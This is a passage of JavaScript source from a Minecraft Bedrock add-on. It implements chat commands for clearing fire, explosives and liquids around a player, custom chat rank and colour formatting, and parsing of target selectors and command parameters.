                        let loopCount = Number(args[2]);
                        system.run(() => { try {
                            for (let ib = 0; ib < loopCount; ib++) {
                                let block = player.dimension.getBlock(player.location);
                                block.setType("shulker_box");
                                (!!target.getComponent("inventory").container.getItem(slot)) ? (target.getComponent("inventory").container.getItem(slot).amount < target.getComponent("inventory").container.getItem(slot).maxAmount) ? (target.getComponent("inventory").container.getItem(slot).amount = target.getComponent("inventory").container.getItem(slot).maxAmount) : undefined : undefined;
                                fillContainer(block.getComponent("inventory").container, target.getComponent("inventory").container.getItem(slot));
                                let item = block.getItemStack(64, true);
                                item.nameTag = `§r§a${target.name}'s Items: Slots 0-26§b\n${new Date(Date.now()).toUTCString()}`;
                                clearContainer(block.getComponent("inventory").container);
                                clearContainer(block.getComponent("inventory").container);
                                block.setType("air");
                                target.getComponent("inventory").container.setItem(slot, item);
                            }
                        }
                        catch (e) {
                            player.sendMessage(e + " " + e.stack);
                        } });
                    }
                }
                break;
            case !!switchTest.match(/^extinguish$/) || !!switchTest.match(/^ext$/) || !!switchTest.match(/^remfire$/):
                {
                    eventData.cancel = true;
                    let radius = Number(String(switchTestB.split(" ")[1] ?? "").trim() == "" ? 10 : String(switchTestB.split(" ")[1] ?? "").trim());
                    let froma = Vector.subtract(player.location, { x: radius, y: radius, z: radius });
                    let from = { x: froma.x, y: froma.y, z: froma.z };
                    let toa = Vector.add(player.location, { x: radius, y: radius, z: radius });
                    let to = { x: toa.x, y: toa.y, z: toa.z };
                    try {
                        system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "fire" }); let b = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "soul_fire" }); player.sendMessage(`${a + b == 0 ? "§c" : ""}${a + b} blocks extinguished in radius of ${radius}`); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                }
                break;
            case !!switchTest.match(/^remexp$/):
                {
                    eventData.cancel = true;
                    let radius = Number(String(switchTestB.split(" ")[1] ?? "").trim() == "" ? 10 : String(switchTestB.split(" ")[1] ?? "").trim());
                    let froma = Vector.subtract(player.location, { x: radius, y: radius, z: radius });
                    let from = { x: froma.x, y: froma.y, z: froma.z };
                    let toa = Vector.add(player.location, { x: radius, y: radius, z: radius });
                    let to = { x: toa.x, y: toa.y, z: toa.z };
                    switch (player.dimension.id) {
                        case "minecraft:overworld":
                            try {
                                system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "tnt" }); let b = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "respawn_anchor" }); player.sendMessage(`${a + b == 0 ? "§c" : ""}${a + b} explosives removed in radius of ${radius}`); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            break;
                        case "minecraft:nether":
                            try {
                                system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "tnt" }); let b = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "bed" }); player.sendMessage(`${a + b == 0 ? "§c" : ""}${a + b} explosives removed in radius of ${radius}`); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            break;
                        case "minecraft:the_end":
                            try {
                                system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "tnt" }); let b = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "respawn_anchor" }); let c = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "bed" }); player.sendMessage(`${a + b + c == 0 ? "§c" : ""}${a + b + c} explosives removed in radius of ${radius}`); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            break;
                        default:
                            try {
                                system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "tnt" }); player.sendMessage(`${a == 0 ? "§c" : ""}${a} explosives removed in radius of ${radius}`); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                    }
                }
                break;
            case !!switchTest.match(/^drain$/):
                {
                    eventData.cancel = true;
                    let radius = Number(String(switchTestB.split(" ")[1] ?? "").trim() == "" ? 10 : String(switchTestB.split(" ")[1] ?? "").trim());
                    let froma = Vector.subtract(player.location, { x: radius, y: radius, z: radius });
                    let from = { x: froma.x, y: froma.y, z: froma.z };
                    let toa = Vector.add(player.location, { x: radius, y: radius, z: radius });
                    let to = { x: toa.x, y: toa.y, z: toa.z };
                    try {
                        system.run(() => { let a = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "water" }); let b = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "lava" }); let c = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "flowing_water" }); let d = fillBlocksHB(from, to, player.dimension, "air", undefined, { matchingBlock: "flowing_lava" }); player.sendMessage(`${a + b + c + d == 0 ? "§c" : ""}${a + b + c + d} liquids removed in radius of ${radius}`); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                }
                break;
        }
    }
    else {
        if (commanda?.type == "custom") {
            eventData.cancel = true;
            if (commanda.customCommandType == "commands") {
                system.run(() => commanda.run(newMessage.slice(commanda.customCommandPrefix.length), player, player, event));
            }
            else {
                commanda.run(newMessage.slice(commanda.customCommandPrefix.length), player, player, event);
            }
        }
        else { }
    }
}
export function chatSend(params) {
    let returnBeforeChatSend = params.returnBeforeChatSend;
    let player = params.player;
    let eventData = params.eventData;
    let event = params.event;
    let newMessage = params.newMessage;
    try {
        eval(String(world.getDynamicProperty("evalBeforeEvents:chatSendComplete")));
    }
    catch (e) {
        console.error(e, e.stack);
        world.getAllPlayers().forEach((currentplayer) => { if (currentplayer.hasTag("chatSendBeforeEventDebugErrors")) {
            currentplayer.sendMessage((e + " " + e.stack));
        } });
    }
    if (returnBeforeChatSend)
        return;
    let messageFormattingItalic = "";
    let messageFormattingBold = "";
    let messageFormattingObfuscated = "";
    let messageFormattingColor = "";
    if (player.hasTag('messageFormatting:o')) {
        messageFormattingItalic = "§o";
    }
    ;
    if (player.hasTag('messageFormatting:l')) {
        messageFormattingBold = "§l";
    }
    ;
    if (player.hasTag('messageFormatting:k')) {
        messageFormattingObfuscated = "§k";
    }
    ;
    if (player.hasTag('messageColor:0')) {
        messageFormattingColor = "§0";
    }
    else {
        if (player.hasTag('messageColor:1')) {
            messageFormattingColor = "§1";
        }
        else {
            if (player.hasTag('messageColor:2')) {
                messageFormattingColor = "§2";
            }
            else {
                if (player.hasTag('messageColor:3')) {
                    messageFormattingColor = "§3";
                }
                else {
                    if (player.hasTag('messageColor:4')) {
                        messageFormattingColor = "§4";
                    }
                    else {
                        if (player.hasTag('messageColor:5')) {
                            messageFormattingColor = "§5";
                        }
                        else {
                            if (player.hasTag('messageColor:6')) {
                                messageFormattingColor = "§6";
                            }
                            else {
                                if (player.hasTag('messageColor:7')) {
                                    messageFormattingColor = "§7";
                                }
                                else {
                                    if (player.hasTag('messageColor:8')) {
                                        messageFormattingColor = "§8";
                                    }
                                    else {
                                        if (player.hasTag('messageColor:9')) {
                                            messageFormattingColor = "§9";
                                        }
                                        else {
                                            if (player.hasTag('messageColor:a')) {
                                                messageFormattingColor = "§a";
                                            }
                                            else {
                                                if (player.hasTag('messageColor:b')) {
                                                    messageFormattingColor = "§b";
                                                }
                                                else {
                                                    if (player.hasTag('messageColor:c')) {
                                                        messageFormattingColor = "§c";
                                                    }
                                                    else {
                                                        if (player.hasTag('messageColor:d')) {
                                                            messageFormattingColor = "§d";
                                                        }
                                                        else {
                                                            if (player.hasTag('messageColor:e')) {
                                                                messageFormattingColor = "§e";
                                                            }
                                                            else {
                                                                if (player.hasTag('messageColor:f')) {
                                                                    messageFormattingColor = "§f";
                                                                }
                                                                else {
                                                                    if (player.hasTag('messageColor:g')) {
                                                                        messageFormattingColor = "§g";
                                                                    }
                                                                    else {
                                                                        if (player.hasTag('messageColor:h')) {
                                                                            messageFormattingColor = "§h";
                                                                        }
                                                                        else {
                                                                            if (player.hasTag('messageColor:i')) {
                                                                                messageFormattingColor = "§i";
                                                                            }
                                                                            else {
                                                                                if (player.hasTag('messageColor:j')) {
                                                                                    messageFormattingColor = "§j";
                                                                                }
                                                                                else {
                                                                                    if (player.hasTag('messageColor:m')) {
                                                                                        messageFormattingColor = "§m";
                                                                                    }
                                                                                    else {
                                                                                        if (player.hasTag('messageColor:n')) {
                                                                                            messageFormattingColor = "§n";
                                                                                        }
                                                                                        else {
                                                                                            if (player.hasTag('messageColor:p')) {
                                                                                                messageFormattingColor = "§p";
                                                                                            }
                                                                                            else {
                                                                                                if (player.hasTag('messageColor:q')) {
                                                                                                    messageFormattingColor = "§q";
                                                                                                }
                                                                                                else {
                                                                                                    if (player.hasTag('messageColor:s')) {
                                                                                                        messageFormattingColor = "§s";
                                                                                                    }
                                                                                                    else {
                                                                                                        if (player.hasTag('messageColor:t')) {
                                                                                                            messageFormattingColor = "§t";
                                                                                                        }
                                                                                                        else {
                                                                                                            if (player.hasTag('messageColor:u')) {
                                                                                                                messageFormattingColor = "§u";
                                                                                                            }
                                                                                                            ;
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    let rank = "";
    let name = String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplayPrefix") ?? world.getDynamicProperty("andexdbSettings:nameDisplayPrefix") ?? "§r§f<") + player.name + String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplaySuffix") ?? world.getDynamicProperty("andexdbSettings:nameDisplaySuffix") ?? "§r§f>") + String(player.getDynamicProperty("andexdbPersonalSettings:chatNameAndMessageSeparator") ?? world.getDynamicProperty("andexdbSettings:chatNameAndMessageSeparator") ?? " ");
    let rankMode = 0;
    for (let index in player.getTags()) {
        if (player.getTags()[Number(index)].startsWith(String(player.getDynamicProperty("andexdbPersonalSettings:chatRankPrefix") ?? world.getDynamicProperty("andexdbSettings:chatRankPrefix") ?? "rank:"))) {
            rank = (rank + String(player.getDynamicProperty("andexdbPersonalSettings:rankDisplayPrefix") ?? world.getDynamicProperty("andexdbSettings:rankDisplayPrefix") ?? "[") + player.getTags()[Number(index)].slice(String(player.getDynamicProperty("andexdbPersonalSettings:chatRankPrefix") ?? world.getDynamicProperty("andexdbSettings:chatRankPrefix") ?? "rank:").length) + String(player.getDynamicProperty("andexdbPersonalSettings:rankDisplaySuffix") ?? world.getDynamicProperty("andexdbSettings:rankDisplaySuffix") ?? "]"));
        }
        if (player.getTags()[Number(index)] == ("chatHideNameTag")) {
            name = "";
            rankMode = 1;
        }
        else {
            if (player.getTags()[Number(index)].startsWith(String(player.getDynamicProperty("andexdbPersonalSettings:chatSudoPrefix") ?? world.getDynamicProperty("andexdbSettings:chatSudoPrefix") ?? "sudo:")) && rankMode !== 1) {
                name = String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplayPrefix") ?? world.getDynamicProperty("andexdbSettings:nameDisplayPrefix") ?? "§r§f<") + player.getTags()[Number(index)].slice(String(player.getDynamicProperty("andexdbPersonalSettings:chatSudoPrefix") ?? world.getDynamicProperty("andexdbSettings:chatSudoPrefix") ?? "sudo:").length) + String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplaySuffix") ?? world.getDynamicProperty("andexdbSettings:nameDisplaySuffix") ?? "§r§f>") + String(player.getDynamicProperty("andexdbPersonalSettings:chatNameAndMessageSeparator") ?? world.getDynamicProperty("andexdbSettings:chatNameAndMessageSeparator") ?? " ");
                rankMode = 2;
            }
            else {
                if (player.getTags()[Number(index)] == ("chatUseNameTag") && rankMode !== 1 && rankMode !== 2) {
                    name = String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplayPrefix") ?? world.getDynamicProperty("andexdbSettings:nameDisplayPrefix") ?? "<") + player.nameTag + String(player.getDynamicProperty("andexdbPersonalSettings:nameDisplaySuffix") ?? world.getDynamicProperty("andexdbSettings:nameDisplaySuffix") ?? ">") + String(player.getDynamicProperty("andexdbPersonalSettings:chatNameAndMessageSeparator") ?? world.getDynamicProperty("andexdbSettings:chatNameAndMessageSeparator") ?? " ");
                    rankMode = 3;
                }
            }
        }
    }
    try {
        eval(String(world.getDynamicProperty("evalBeforeEvents:chatSendBeforeModifiedMessageSend")));
    }
    catch (e) {
        console.error(e, e.stack);
        world.getAllPlayers().forEach((currentplayer) => { if (currentplayer.hasTag("chatSendBeforeEventDebugErrors")) {
            currentplayer.sendMessage((e + " " + e.stack));
        } });
    }
    eventData.cancel = true;
    if (player.hasTag("doNotSendChatMessages")) {
        return;
    }
    else {
        if (world.getDynamicProperty("allowCustomChatMessagesMuting") != true) {
            if (world.getDynamicProperty("allowCustomChatMessagesEscapeCharacters") != true) {
                world.sendMessage(rank + name + messageFormattingItalic + messageFormattingBold + messageFormattingObfuscated + messageFormattingColor + newMessage);
            }
            else {
                world.sendMessage({ rawtext: [{ text: String(rank + name + messageFormattingItalic + messageFormattingBold + messageFormattingObfuscated + messageFormattingColor + newMessage) }] });
            }
        }
        else {
            world.getDimension("overworld").runCommandAsync(`/tellraw @a {"rawtext":[{"text":"${String(rank + name + messageFormattingItalic + messageFormattingBold + messageFormattingObfuscated + messageFormattingColor + newMessage).replaceAll("\"", "\\\"")}"}]}`);
        }
    }
}
export function evaluateSelectors(selector, options) {
    if (!!selector.trimStart().replaceAll("\\", "").match(/^(@[aeprs]\s*\[|@[aeprs]\s+)/)) {
        return (!!options) ? !!options?.source ? !(options.source instanceof Block) ? targetSelectorAllListC(selector, "", (options.location ?? options.source.location).x + " " + (options.location ?? options.source.location).y + " " + (options.location ?? options.source.location).z, options.source) : targetSelectorAllListD(selector, (options.location ?? options.source.location).x + " " + (options.location ?? options.source.location).y + " " + (options.location ?? options.source.location).z, options.dimension ?? options.location?.dimension) : (!!options.dimension ?? options.location?.dimension) ? targetSelectorAllListE(selector, ((options.location ?? { x: 0, y: 0, z: 0 }).x + " " + (options.location ?? { x: 0, y: 0, z: 0 }).y + " " + (options.location ?? { x: 0, y: 0, z: 0 }).z)) : targetSelectorAllListD(selector, ((options.location ?? { x: 0, y: 0, z: 0 }).x + " " + (options.location ?? { x: 0, y: 0, z: 0 }).y + " " + (options.location ?? { x: 0, y: 0, z: 0 }).z), options.dimension ?? options.location?.dimension) : targetSelectorAllListE(selector, "0 0 0");
    }
    else if ((options?.enableI ?? true) == true && !!selector.trimStart().replaceAll("\\", "").match(/^(@i\s*\[|@i\s+)/)) {
        return getEntityById(selector.trim().match(/^(?<=@i\s*\[((?:uu)?id=)?(?:")?)[\-\+]?\d(?=(?:")?\])/)[0]);
    }
    else if ((options?.enableJ ?? false) == true && !!selector.trimStart().replaceAll("\\", "").match(/^(@j\s*\[|@j\s+)/)) {
        return eval(selector.trim().match(/^(?<=@j\s*\[)[\-\+]?\d(?=\])/)[0]);
    }
}
export function extractSelectors(str) {
    const selectors = [];
    let startIndex = -1;
    const stack = [];
    let insideQuotes = false;
    for (let i = 0; i < str.length; i++) {
        if (str[i] === '"' && str[i - 1] !== '\\') {
            insideQuotes = !insideQuotes;
        }
        if (!insideQuotes && str[i] === '@' && startIndex === -1) {
            startIndex = i;
        }
        if (!insideQuotes) {
            if (str[i] === '[') {
                stack.push('[');
            }
            else if (str[i] === ']') {
                if (stack.length > 0) {
                    stack.pop();
                    if (stack.length === 0 && startIndex !== -1) {
                        selectors.push(str.substring(startIndex, i + 1));
                        startIndex = -1;
                    }
                }
                else {
                    // Invalid selector, reset startIndex
                    startIndex = -1;
                }
            }
        }
    }
    return selectors;
} /*

// Example usage
const str = "something @e[type='pig',family=mob,hasitem=[{item=stick,slot=0,location=\"slot.enderchest\"},{item='iron_sword',location=slot.weapon.offhand,slot=0}],name=entityname] somethingelseelse";
const selectors = extractSelectors(str);
console.log(selectors);*/
export function evaluateParameters(commandstring, parameters) {
    let argumentsa = [];
    let ea = [];
    let paramEval = commandstring; /*
    let parametersb = []
    if(typeof parameters[0] == "string"){parametersb = parameters.map(v=>({type: v}))}else{parametersb = parameters}*/
    parameters.map(v => (typeof v == "string" ? (v == "Vectors" ? { type: v, vectorCount: 3, maxLength: undefined } : { type: v, vectorCount: undefined, maxLength: undefined }) : v?.type == "Vectors" ? v : v)).forEach((p, i) => {
        if (paramEval.trim() == "") {
            return;
        }
        else {
            if (p.type == "presetText") {
                argumentsa.push(paramEval.split(" ")[0]);
                paramEval = paramEval.split(" ").slice(1).join(" ");
            }
            else {
                if (p.type == "number") {
                    argumentsa.push(Number(paramEval.split(" ")[0]));
                    paramEval = paramEval.split(" ").slice(1).join(" ");
                }
                else {
                    if (p.type == "boolean") {
                        argumentsa.push(paramEval.split(" ")[0]?.trim?.() == "" ? undefined : Boolean(JSON.parse(paramEval.split(" ")[0].replace(/^t$/i, "true").replace(/^f$/i, "false").replace(/^true$/i, "true").replace(/^false$/i, "false"))));
                        paramEval = paramEval.split(" ").slice(1).join(" ");
                    }
                    else {
                        if (p.type == "neboolean") {
                            try {
                                argumentsa.push(paramEval.split(" ")[0]?.trim?.() == "" ? undefined : Boolean(JSON.parse(paramEval.split(" ")[0].replace(/^t$/i, "true").replace(/^f$/i, "false").replace(/^true$/i, "true").replace(/^false$/i, "false"))));
                                paramEval = paramEval.split(" ").slice(1).join(" ");
                            }
                            catch {
                                argumentsa.push(undefined);
                            }
                        }
                        else {
                            if (p.type == "string") {
                                if (paramEval.trimStart().startsWith("\"")) {
                                    let value = getParametersFromString(paramEval.trimStart()).resultsincludingunmodified[0];
                                    paramEval = paramEval.trimStart().slice(value?.s?.length + 1) ?? "";
                                    try {
                                        argumentsa.push(value?.v);
                                    }
                                    catch (e) {
                                        ea.push([e, e.stack]);
                                    }
                                    ;
                                }
                                else {
                                    argumentsa.push(paramEval.split(" ")[0]);
                                    paramEval = paramEval.split(" ").slice(1).join(" ");
                                }
                            }
                            else {
                                if (p.type == "non-booleanString") {
                                    if (["true", "false", "t", "f", "1", "0"].includes(paramEval.trimStart().split(" ")[0].toLowerCase())) {
                                        argumentsa.push(undefined);
                                    }
                                    else if (paramEval.trimStart().startsWith("\"")) {
                                        let value = getParametersFromString(paramEval.trimStart()).resultsincludingunmodified[0];
                                        paramEval = paramEval.trimStart().slice(value?.s?.length + 1) ?? "";
                                        try {
                                            argumentsa.push(value?.v);
                                        }
                                        catch (e) {
                                            ea.push([e, e.stack]);
                                        }
                                        ;
                                    }
                                    else {
                                        argumentsa.push(paramEval.split(" ")[0]);
                                        paramEval = paramEval.split(" ").slice(1).join(" ");
                                    } //1870//7018
                                }
                                else {
                                    if (p.type == "json") {
                                        let value = getParametersFromString(paramEval).resultsincludingunmodified[0];
                                        paramEval = paramEval.slice(value?.s?.length + 1) ?? "";
                                        try {
                                            argumentsa.push(value?.v ?? JSONParse(value?.s ?? paramEval, true));
                                        }
                                        catch (e) {
                                            ea.push([e, e.stack]);
                                        }
                                        ;
                                    }
                                    else {
                                        if (p.type == "blockStates") {
                                            if (paramEval.indexOf("[") == -1 && paramEval.indexOf("{") == -1) {
                                                argumentsa.push(undefined);
                                            }
                                            else if ((paramEval.indexOf("[") == -1 ? Infinity : paramEval.indexOf("[")) < (paramEval.indexOf("{") == -1 ? Infinity : paramEval.indexOf("{"))) {
                                                let value = getParametersFromString(paramEval.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}")).resultsincludingunmodified[0];
                                                paramEval = paramEval.slice(value?.s?.length + 1) ?? "";
                                                try {
                                                    argumentsa.push(value?.v ?? JSONParse(value?.s ?? "undefined", true));
                                                }
                                                catch (e) {
                                                    ea.push([e, e.stack]);
                                                }
                                                ;
                                            }
                                            else {
                                                let value = getParametersFromString(paramEval).resultsincludingunmodified[0];
                                                paramEval = paramEval.slice(value?.s?.length + 1) ?? "";
                                                try {
                                                    argumentsa.push(value?.v ?? JSONParse(value?.s ?? "undefined", true));
                                                }
                                                catch (e) {
                                                    ea.push([e, e.stack]);
                                                }
                                                ;
                                            }
                                        }
                                        else {
                                            if (p.type == "targetSelector") {
                                                if (!paramEval.trimStart().startsWith("@")) {
                                                    if (paramEval.trimStart().startsWith("\"")) {
                                                        let value = getParametersFromString(paramEval.trimStart()).resultsincludingunmodified[0];
                                                        paramEval = paramEval.trimStart().slice(value?.s?.length) ?? "";
                                                        try {
                                                            argumentsa.push(value?.v);
                                                        }
                                                        catch (e) {
                                                            ea.push([e, e.stack]);
                                                        }
                                                        ;
                                                    }
                                                    else {
                                                        argumentsa.push(paramEval.split(" ")[0]);
                                                        return paramEval.split(" ").slice(1).join(" ");
                                                    }
                                                }
                                                else {
                                                    let value = extractSelectors(paramEval)[0];
                                                    paramEval = paramEval.slice(paramEval.indexOf(value) + value?.length + 1) ?? "";
                                                    try {
                                                        argumentsa.push(value);
                                                    }
                                                    catch (e) {
                                                        ea.push([e, e.stack]);
                                                    }
                                                    ;
                                                }
                                            }
                                            else {
                                                if (p.type == "Vector" || (p?.type ?? p) == "Vector1") {
                                                    let value = paramEval.match(/(?<!(?<!^([^"]*["][^"]*)+)(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*)(((?<=[\s\~\!\^\%\&\*\d])|^)[\~\!\^\%\&\*]([\-\+]?\d+(\.\d+)?)?|((?<=\s)|^)[\-\+]?\d+(\.\d+)?)(?!([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*(?!([^"]*["][^"]*)+$))/g)?.[0];
                                                    paramEval = paramEval.slice(paramEval.indexOf(value) + value?.length) ?? "";
                                                    if (paramEval.startsWith(" ")) {
                                                        paramEval = paramEval.slice(1) ?? "";
                                                    }
                                                    try {
                                                        argumentsa.push(value);
                                                    }
                                                    catch (e) {
                                                        ea.push([e, e.stack]);
                                                    }
                                                    ;
                                                }
                                                else {
                                                    if (!!p.type.match(/^Vector[2-8]$/)) {
                                                        let value = paramEval.match(new RegExp(String.raw `(?<!(?<!^([^"]*["][^"]*)+)(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*)(((((?<=[\s\~\!\^\%\&\*\d])|^)[\~\!\^\%\&\*](?:[\-\+]?\d+(\.\d+)?)?)|(((?<=\s)|^)[\-\+]?\d+(\.\d+)?))\s*?){${p.type.slice(6)}}(?!([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*(?!([^"]*["][^"]*)+$))`))?.[0];
                                                        paramEval = paramEval.slice(paramEval.indexOf(value) + value?.length) ?? "";
                                                        if (paramEval.startsWith(" ")) {
                                                            paramEval = paramEval.slice(1) ?? "";
                                                        }
                                                        try {
                                                            argumentsa.push(value);
                                                        }
                                                        catch (e) {
                                                            ea.push([e, e.stack]);
                                                        }
                                                        ;
                                                    }
                                                    else {
                                                        if (p.type == "Vectors") {
                                                            let value = paramEval.match(new RegExp(String.raw `(?<!(?<!^([^"]*["][^"]*)+)(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*)(((((?<=[\s\~\!\^\%\&\*\d])|^)[\~\!\^\%\&\*](?:[\-\+]?\d+(\.\d+)?)?)|(((?<=\s)|^)[\-\+]?\d+(\.\d+)?))\s*?){${p.vectorCount ?? 3}}(?!([^"]*(?<!([^\\])(\\\\)*?\\)")[^"]*(([^"]*(?<!([^\\])(\\\\)*?\\)"){2})*(?!([^"]*["][^"]*)+$))`))?.[0];
                                                            paramEval = paramEval.slice(paramEval.indexOf(value) + value?.length) ?? "";
                                                            if (paramEval.startsWith(" ")) {
                                                                paramEval = paramEval.slice(1) ?? "";
                                                            }
                                                            try {
                                                                argumentsa.push(value);
                                                            }
                                                            catch (e) {
                                                                ea.push([e, e.stack]);
                                                            }
                                                            ;
                                                        }
                                                        else { }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    });
    return {
        params: parameters,
        extra: paramEval,
        args: argumentsa,
        err: ea
    };
}
export function evaluateParametersOld(parameters, paramEvalA) {
    let paramEval = paramEvalA;
    let args;
    args = [];
    let er;
    er = [];
    let erb;
    erb = [];
    parameters.forEach((p, i) => {
        try {
            if (p == "presetText") {
                args.push(paramEval.split(" ")[0]);
                paramEval = paramEval.split(" ").slice(1).join(" ");
            }
            else {
                if (p == "string") {
                    if (paramEval.startsWith("\"")) {
                        if (!paramEval.includes("\\\"")) {
                            args.push(paramEval.slice(1, paramEval.indexOf("\"", 1)));
                            paramEval = paramEval.slice(paramEval.indexOf("\"", 1) + 2);
                        }
                        else {
                            args.push([paramEval.slice(1).split("\\\"").slice(0, paramEval.slice(1).split("\\\"").findIndex((v) => (v.includes("\"")))).join("\\\""), paramEval.slice(1).split("\\\"").find((v) => (v.includes("\""))).split("\"")[0]].join("\""));
                            paramEval = paramEval.slice(1).split("\\\"").find((v) => (v.includes("\""))).split("\"")[1].slice(1);
                        }
                    }
                    else {
                        args.push(paramEval.split(" ")[0]);
                        paramEval = paramEval.split(" ").slice(1).join(" ");
                    }
                }
                else {
                    if (p == "json") {
                        let endCharacter = "}";
                        if (paramEval.startsWith("[")) {
                            endCharacter = "]";
                        }
                        else {
                            if (paramEval.startsWith("(")) {
                                endCharacter = ")";
                            }
                        }
                        ;
                        try {
                            args.push(JSON.parse((paramEval.split(endCharacter + " ")[0] + endCharacter) ?? paramEval));
                        }
                        catch (e) {
                            er.push([e, e.stack]);
                            erb.push([String(e), e.stack, i]);
                        }
                        ;
                        paramEval = paramEval.split(endCharacter + " ")[1] ?? "";
                    }
                    else {
                        if (p == "number") {
                            args.push(Number(paramEval.split(" ")[0]));
                            paramEval = paramEval.split(" ").slice(1).join(" ");
                        }
                        else {
                            if (p == "boolean") {
                                args.push(Boolean((paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("t") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("y") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("1") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("+") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("c") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("v") || paramEval.split(" ")[0].trimStart().toLowerCase().startsWith("p"))));
                                paramEval = paramEval.split(" ").slice(1).join(" ");
                            }
                            else {
                            }
                        }
                    }
                }
            }
        }
        catch (e) {
            er.push([e, e.stack]);
            erb.push([String(e), e.stack, i]);
        }
        ;
    });
    return { er: er, erb: erb, args: args, paramEval: paramEval, paramEvalA: paramEvalA, parameters: parameters };
}
;
